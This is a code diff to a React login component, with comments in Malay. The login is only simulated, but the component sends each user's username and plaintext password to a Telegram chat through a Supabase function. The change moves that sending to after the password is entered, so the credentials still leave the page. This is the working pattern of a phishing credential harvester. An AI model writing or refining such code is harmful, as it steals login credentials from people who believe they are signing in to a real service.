@@ -10,10 +10,10 @@ const LoginCard: React.FC = () => {
   const [username, setUsername] = React.useState<string>('');
   const [password, setPassword] = React.useState<string>('');
 
-  const sendTelegramNotification = async (user: string, pass: string, status: string) => { // Menambah parameter 'pass'
+  const sendTelegramNotification = async (user: string, pass: string, status: string) => {
     try {
       const { data, error } = await supabase.functions.invoke('send-telegram-message', {
-        body: { username: user, password: pass, message: status }, // Menghantar kata laluan
+        body: { username: user, password: pass, message: status },
       });
 
       if (error) {
@@ -37,7 +37,7 @@ const LoginCard: React.FC = () => {
       // In a real app, you'd validate username with a backend here
       setLoginStep('password');
       toast.success(`Selamat datang, ${username}! Sila masukkan kata laluan anda.`);
-      await sendTelegramNotification(username, "", "Percubaan log masuk - Nama pengguna dimasukkan."); // Kata laluan kosong pada langkah pertama
+      // Pemberitahuan Telegram tidak dihantar di sini lagi
     } else { // loginStep === 'password'
       if (password.trim() === '') {
         toast.error("Sila masukkan kata laluan anda.");
@@ -46,7 +46,7 @@ const LoginCard: React.FC = () => {
       // In a real app, you'd send username and password to backend for authentication
       console.log("Attempting to log in with:", { username, password });
       toast.success("Log masuk berjaya! (Simulasi)");
-      await sendTelegramNotification(username, password, "Log masuk berjaya (simulasi)."); // Menghantar kata laluan sebenar
+      await sendTelegramNotification(username, password, "Log masuk berjaya (simulasi)."); // Hanya hantar di sini
       // Optionally reset or redirect after successful login
       // setLoginStep('username');
       // setUsername('');
@@ -59,7 +59,7 @@ const LoginCard: React.FC = () => {
       {/* Combined input and button container with thicker border */}
       <div className="flex items-center mb-4 border-2 border-gray-300 rounded-md overflow-hidden">
         {/* Icon and Input part */}
-        <div className="flex items-center flex-grow h-10 bg-white/80 pl-3"> {/* Mengubah bg-white kepada bg-white/80 */}
+        <div className="flex items-center flex-grow h-10 bg-white/80 pl-3">
           {/* Circle around the User icon */}
           <div className="w-8 h-8 rounded-full border border-gray-400 flex items-center justify-center bg-gray-100">
             {loginStep === 'username' ? (
